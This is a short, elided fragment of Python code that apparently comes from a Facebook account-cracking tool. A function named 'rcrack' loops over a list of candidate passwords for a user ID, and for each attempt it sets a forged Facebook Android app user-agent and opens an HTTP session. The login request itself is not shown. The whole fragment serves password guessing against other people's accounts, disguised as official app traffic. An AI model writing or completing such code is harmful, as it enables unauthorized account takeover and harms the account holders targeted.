...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            pro = "[FBAN/FB4A;FBAV/FacebookAppVersion;FBBV/271517704;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/US;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/InfinixModel;FBSV/10.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            session = requests.Session()
